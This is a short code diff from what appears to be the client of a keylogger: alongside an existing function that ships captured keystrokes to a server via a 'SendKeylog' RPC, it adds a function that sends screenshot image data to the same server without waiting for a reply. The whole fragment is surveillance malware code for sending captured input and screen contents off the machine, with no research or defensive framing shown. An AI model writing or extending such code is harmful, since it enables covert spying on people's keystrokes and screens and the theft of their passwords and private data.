@@ -12,3 +12,24 @@ def send_key_non_blocking(text):
     """
     # Fire-and-forget RPC call
     stub.SendKeylog.future(keylog_pb2.KeylogRequest(message=text))
+
+def send_screenshot_non_blocking(filename, image_data):
+    """
+    Send screenshot to the server WITHOUT WAITING for response.
+    
+    Args:
+        filename: Name of the screenshot file (e.g., "screenshot_20260206_123456.png")
+        image_data: Binary image data (bytes)
+    
+    Example usage:
+        with open("screenshot.png", "rb") as f:
+            image_data = f.read()
+        send_screenshot_non_blocking("screenshot.png", image_data)
+    """
+    # Fire-and-forget RPC call
+    stub.SendScreenshot.future(
+        keylog_pb2.ScreenshotRequest(
+            filename=filename,
+            image_data=image_data
+        )
+    )
